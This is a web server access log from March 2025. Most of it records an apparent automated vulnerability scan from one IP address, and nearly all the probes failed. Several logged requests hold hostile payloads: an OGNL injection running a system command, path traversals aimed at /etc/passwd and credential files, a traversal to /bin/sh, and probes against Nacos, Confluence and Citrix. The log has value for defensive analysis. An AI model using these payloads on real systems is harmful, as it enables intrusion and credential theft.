127.0.0.1 - - [18/Mar/2025:09:58:21 +0900] "GET / HTTP/1.1" 200 116
185.216.140.186 - - [18/Mar/2025:10:37:39 +0900] "GET /ping.js HTTP/1.1" 404 814
172.10.12.65 - - [18/Mar/2025:10:49:39 +0900] "GET /file_sample.html HTTP/1.1" 200 606
172.10.12.65 - - [18/Mar/2025:10:49:39 +0900] "GET /favicon.ico HTTP/1.1" 200 21630
35.80.142.130 - - [18/Mar/2025:10:57:49 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET /jbossmq-httpil/HTTPServerILServlet HTTP/1.1" 404 769
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET /services HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "POST null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "POST /actuator/gateway/routes/xdxiwvqd HTTP/1.1" 404 775
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1" 404 1018
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "POST / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:51 +0900] "GET /certsrv/certrqad.asp HTTP/1.1" 404 755
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "PUT /fileserver/jiwcwq.txt HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET /admin/ HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET /admin/ HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "POST /api/v1/user/login HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET /api/v1/canal/config/1/1 HTTP/1.1" 404 774
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "POST /nacos/v1/auth/users?username=qzypdvyfjqlosqhy&password=rwvxddmhqyuncbth HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name HTTP/1.1" 404 761
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "POST /druid/indexer/v1/sampler?for=connect HTTP/1.1" 404 767
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET /nacos/ HTTP/1.1" 404 741
35.80.142.130 - - [18/Mar/2025:10:57:52 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /jars HTTP/1.1" 404 735
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /servlet/AxisaxiServlet HTTP/1.1" 404 757
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /kylin/api/admin/config HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "POST /webtools/control/xmlrpc HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "POST /webtools/control/xmlrpc HTTP/1.1" 404 762
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /nifi-api/flow/current-user HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:57:53 +0900] "GET /pma/ HTTP/1.1" 404 739
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET /plug/oem/AspCms_OEMFun.asp HTTP/1.1" 404 765
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7 HTTP/1.1" 404 768
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET / HTTP/1.1" 200 116
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET /sql.zip HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "POST /cu.html HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua HTTP/1.1" 404 760
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1" 404 771
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "POST /druid/indexer/v1/sampler?for=connect HTTP/1.1" 404 767
35.80.142.130 - - [18/Mar/2025:10:57:54 +0900] "POST /menu/stapp HTTP/1.1" 404 745
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /servlet/AxisServlet HTTP/1.1" 404 754
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1" 404 748
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1" 400 764
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd HTTP/1.1" 404 744
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1" 404 768
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /spaces/viewdefaultdecorator.action?decoratorName HTTP/1.1" 404 769
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "POST /rest/tinymce/1/macro/preview HTTP/1.1" 404 775
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1" 404 773
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /s/lrrymu/_/;/WEB-INF/web.xml HTTP/1.1" 404 779
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /v1/agent/self HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:57:55 +0900] "GET /v1/agent/self HTTP/1.1" 404 752
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /mailsms/s?func=ADMIN:appState&dumpConfig=/ HTTP/1.1" 404 744
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /includes/mysql2i/mysql2i.func.php HTTP/1.1" 404 772
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "PUT /_users/org.couchdb.user:qvhwiceoumvasfzalsjaujlizwglmarv HTTP/1.1" 405 633
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /www.zip HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /_config HTTP/1.1" 404 738
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /plus/carbuyaction.php?dopost=return&code=../../ HTTP/1.1" 404 756
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /include/downmix.inc.php HTTP/1.1" 404 758
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "POST /login.cgi HTTP/1.1" 404 740
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET null HTTP/1.1" 400 2173
35.80.142.130 - - [18/Mar/2025:10:57:56 +0900] "GET /services/listServices HTTP/1.1" 404 756
